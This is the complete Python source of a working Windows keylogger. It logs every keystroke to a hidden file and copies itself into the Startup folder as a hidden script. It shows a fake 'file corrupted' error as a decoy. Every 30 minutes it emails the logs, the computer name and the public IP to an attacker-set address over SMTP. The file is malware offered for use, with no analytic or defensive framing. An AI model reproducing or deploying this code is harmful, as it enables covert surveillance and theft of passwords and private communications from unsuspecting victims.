from pynput.keyboard import Key,Listener
import smtplib
from time import asctime,time,localtime,sleep
import os
from shutil import copyfile
import ctypes  
import schedule
import requests
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
import threading


class Keyboard:
    
    def __init__(self):
        self.t=localtime()
        self.current_user=os.getlogin()
        self.log_file=f'C:\\Users\\{self.current_user}\\AppData\\Keylogs.txt'
        
        open(self.log_file,'w').close()
        if os.path.isfile(self.log_file):
            os.system(f'attrib +h {self.log_file}')
        #checks if the file already exists in the destination directory !
        self.file_path=f'C:\\Users\\{self.current_user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Whosit.pyw'
        if not os.path.isfile(self.file_path):
            ctypes.windll.user32.MessageBoxW(0, "Error !", "The File Has Been Corrupted !", 0x30)
            copyfile('./Whosit.pyw',self.file_path)#change this to the exe file when editing 
            os.system(f'attrib +h {self.file_path}')

    def on_press(self,key):
        with open(self.log_file,'a+') as file_name:
            file_name.write(f'{key} pressed {asctime(self.t)}\n')

    def invoke_listener(self):
        with Listener(on_press=self.on_press) as key_listener:
            key_listener.join()


class Mail:
        
    def __init__(self):
       
        self.source_email=os.environ['_EMAIL_'] #the source email credentials !(Set via Env Variables to ensure safety !)
        self.source_email_pass=os.environ['PASS']#go to env varibales via start menu->Edit Env Varibales->new->Provide the variable name and value !
        self.target_email=os.environ['MAIL']#destination email address !
        
        self.body='The Keylog Information is Attached Along with This Email.Please Select the largest file !'
        self.email_main=MIMEMultipart()
        self.email_main['From'] = self.source_email
        self.email_main['To'] = self.target_email
        self.current_user=os.getlogin()
        
        

    def send_mail(self):
        #a third party website is used to provide the external ip !
        self.email_main['Subject'] = f'Keylog Information of Computer : {os.environ["COMPUTERNAME"]}, with public IP : {requests.get("https://api.ipify.org").text}. Date : {asctime(localtime())}.'
        self.email_main.attach(MIMEText(self.body,'plain'))
        self.payload=MIMEBase('application','octet-stream')
        self.key_log = open(f'C:\\Users\\{self.current_user}\\AppData\\Keylogs.txt','r')
        self.payload.set_payload((self.key_log).read())
        # encode into base64 
        encoders.encode_base64(self.payload)#convert to base64 
        self.payload.add_header('Content-Disposition', 'attachment', filename='Keylogs.txt') 
        self.email_main.attach(self.payload)#attach the payload !
        with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp:
            #smtp.starttls()
            message=self.email_main.as_string()
            smtp.login(self.source_email,self.source_email_pass)
            smtp.sendmail(self.source_email,self.target_email,message)
            smtp.quit()
    def call_job(self):
        schedule.every(30).minutes.do(self.send_mail)#you can change the duration
        while True:
            schedule.run_pending()
            sleep(1)
        


key_logger=Keyboard()
email=Mail()
#to ensure concurrency !
threading.Thread(target=key_logger.invoke_listener).start()
threading.Thread(target=email.call_job).start()


